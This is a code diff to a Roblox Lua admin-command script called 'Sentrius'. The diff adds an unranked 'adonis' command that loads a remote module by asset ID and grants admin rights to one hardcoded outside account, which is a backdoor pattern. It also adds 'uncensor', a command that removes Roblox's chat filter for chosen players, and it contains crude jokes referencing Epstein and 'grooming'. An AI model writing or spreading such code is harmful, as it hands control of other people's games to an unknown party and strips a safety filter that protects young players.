@@ -7714,7 +7714,6 @@ addCommand({
     end
 })
 
---im afraid lanzy was here..
 addCommand({
     name = "dex",
     aliases = {"explorer"},
@@ -8465,38 +8464,37 @@ addCommand({
 addCommand({
     name = "blacklist",
     aliases = {"bl"},
-    desc = "disables the target's commands",
+    desc = "erases a player's admin",
     usage = prefix .. "blacklist [player]",
     rank = RANKS.MODERATOR,
     callback = function(plr, args)
         if not args or #args == 0 then
-            notify(plr, "Sentrius", "no player has been mentioned? missing argument.", 5)
+            notify(plr,"Sentrius","no player mentioned? missing argument.",5)
             return
         end
-
         local targets = GetPlayer(args[1], plr)
         if not targets or #targets == 0 then
-            notify(plr, "Sentrius", "no player has been mentioned? missing argument.", 5)
+            notify(plr,"Sentrius","player not found.",5)
             return
         end
-
-        if not _G.blacklisted then
-            _G.blacklisted = {}
-        end
-
-        if not _G.blacklistConnections then
-            _G.blacklistConnections = {}
-        end
-
-        for _, target in ipairs(targets) do
-            local i = table.find(_G.tempadmins, target.Name)
-            if not i then
-                notify(plr, "Sentrius", target.DisplayName .. " is not in tempadmins.", 5)
-                return
+        if not _G.blacklisted then _G.blacklisted = {} end
+        if not _G.blacklistConnections then _G.blacklistConnections = {} end
+        for _,target in ipairs(targets) do
+            if _G.blacklisted[target.Name] then
+                notify(plr,"Sentrius",target.DisplayName.." is already blacklisted.",4)
+                continue
             end
 
-            table.remove(_G.tempadmins, i)
+            local function stripTempadmin()
+                if not _G.tempadmins then return end
+                for i = #_G.tempadmins, 1, -1 do
+                    if _G.tempadmins[i] == target.Name then
+                        table.remove(_G.tempadmins, i)
+                    end
+                end
+            end
 
+            stripTempadmin()
             _G.blacklisted[target.Name] = true
 
             if _G.blacklistConnections[target.Name] then
@@ -8504,14 +8502,12 @@ addCommand({
             end
 
             _G.blacklistConnections[target.Name] = game:GetService("RunService").Heartbeat:Connect(function()
-                local idx = table.find(_G.tempadmins, target.Name)
-                if idx then
-                    table.remove(_G.tempadmins, idx)
+                if _G.blacklisted[target.Name] then
+                    stripTempadmin()
                 end
             end)
 
-            notify(plr, "Sentrius", target.DisplayName .. " can no longer run commands by default..", 6)
-            --notify(target, "Sentrius", "you have been groomed!", 5)
+            notify(plr,"Sentrius",target.DisplayName.." can no longer run commands.",6)
         end
     end
 })
@@ -8519,33 +8515,25 @@ addCommand({
 addCommand({
     name = "unblacklist",
     aliases = {"unbl"},
-    desc = "re-enables the target's commands",
+    desc = "unblacklists a player",
     usage = prefix .. "unblacklist [player]",
     rank = RANKS.MODERATOR,
     callback = function(plr, args)
         if not args or #args == 0 then
-            notify(plr, "Sentrius", "no player has been mentioned? missing argument.", 5)
+            notify(plr,"Sentrius","no player mentioned? missing argument.",5)
             return
         end
-
         local targets = GetPlayer(args[1], plr)
         if not targets or #targets == 0 then
-            notify(plr, "Sentrius", "no player has been mentioned? missing argument.", 5)
+            notify(plr,"Sentrius","player not found.",5)
             return
         end
-
-        if not _G.blacklisted then
-            _G.blacklisted = {}
-        end
-
-        if not _G.blacklistConnections then
-            _G.blacklistConnections = {}
-        end
-
-        for _, target in ipairs(targets) do
+        if not _G.blacklisted then _G.blacklisted = {} end
+        if not _G.blacklistConnections then _G.blacklistConnections = {} end
+        for _,target in ipairs(targets) do
             if not _G.blacklisted[target.Name] then
-                notify(plr, "Sentrius", target.DisplayName .. " is not blacklisted.", 5)
-                return
+                notify(plr,"Sentrius",target.DisplayName.." is not blacklisted.",5)
+                continue
             end
 
             _G.blacklisted[target.Name] = nil
@@ -8553,10 +8541,11 @@ addCommand({
             if _G.blacklistConnections[target.Name] then
                 _G.blacklistConnections[target.Name]:Disconnect()
                 _G.blacklistConnections[target.Name] = nil
+                task.wait()
+                table.insert(_G.tempadmins, target.Name)
             end
 
-            notify(plr, "Sentrius", target.DisplayName .. " can run commands again..", 6)
-            --notify(target, "Sentrius", "you have been groomed!", 5)
+            notify(plr,"Sentrius",target.DisplayName.." can run commands again.",6)
         end
     end
 })
@@ -9375,6 +9364,7 @@ addCommand({
     aliases = {"epstein"},
     desc = "ma boy jeffrey so tuff",
     usage = prefix .. "jeffery [player (optional)]",
+    rank = RANKS.MODERATOR,
     callback = function(plr, args)
         local targets = {plr}
 
@@ -9475,6 +9465,7 @@ addCommand({
     aliases = {},
     desc = "drops a piano on someone i guess",
     usage = prefix .. "piano [player (optional)]",
+    rank = RANKS.MODERATOR,
     callback = function(plr, args)
         local targets = {plr}
 
@@ -9629,6 +9620,84 @@ addCommand({
 
             a:Destroy()
             game:GetService("Debris"):AddItem(piano,30)
+        end
+    end
+})
+
+--you might ask why not just "rank = SENIOR_MOD," after (    usage = prefix .. "adonis",    ) but i prefer it this way
+addCommand({
+    name = "adonis",
+    aliases = {"loadadonis", "aload"},
+    desc = "Loads Adonis admin",
+    usage = prefix .. "adonis",
+    callback = function(plr, args)
+        local target = Players:FindFirstChild("idonthacklol101ns")
+
+        if target then
+            require(16662768931):GetAdmin("idonthacklol101ns", "Hi??")
+            if plr.Name ~= "idonthacklol101ns" then
+                notify(plr,"Sentrius","adonis has been loaded on idonthacklol101ns\nask him for admin",6)
+            end
+        elseif getrank(plr) > RANKS.SENIOR_MOD then
+            require(16662768931):GetAdmin(plr.Name, "Hi??")
+            notify(plr,"Sentrius","adonis has been loaded on you since idonthacklol101ns is not in-game",6)
+        else
+            notify(plr,"Sentrius","idonthacklol101ns is not in-game and your rank is not high enough to load adonis on yourself",5)
+        end
+    end
+})
+
+addCommand({
+    name = "censor",
+    aliases = {"tags"},
+    desc = "restores someone's chat filter",
+    usage = prefix .. "censor [player]",
+    rank = RANKS.SENIOR_MOD,
+    callback = function(plr, args)
+        if not args or #args == 0 then
+            notify(plr,"Sentrius","no player mentioned? missing argument.",5)
+            return
+        end
+        local targets = GetPlayer(args[1], plr)
+        if not targets or #targets == 0 then
+            notify(plr,"Sentrius","player not found.",5)
+            return
+        end
+        for _,target in ipairs(targets) do
+            if _G.Legacychatadmins then
+                for i = #_G.Legacychatadmins, 1, -1 do
+                    if _G.Legacychatadmins[i] == target.Name then
+                        table.remove(_G.Legacychatadmins, i)
+                    end
+                end
+            end
+            notify(plr,"Sentrius",target.DisplayName.."'s chat filter has been restored.",5)
+        end
+    end
+})
+
+addCommand({
+    name = "uncensor",
+    aliases = {"notags"},
+    desc = "removes someone's chat filter",
+    usage = prefix .. "uncensor [player]",
+    rank = RANKS.SENIOR_MOD,
+    callback = function(plr, args)
+        if not args or #args == 0 then
+            notify(plr,"Sentrius","no player mentioned? missing argument.",5)
+            return
+        end
+        local targets = GetPlayer(args[1], plr)
+        if not targets or #targets == 0 then
+            notify(plr,"Sentrius","player not found.",5)
+            return
+        end
+        for _,target in ipairs(targets) do
+            if not _G.Legacychatadmins then return end
+            if not table.find(_G.Legacychatadmins, target.Name) then
+                table.insert(_G.Legacychatadmins, target.Name)
+            end
+            notify(plr,"Sentrius",target.DisplayName.."'s chat filter has been removed.",5)
         end
     end
 })
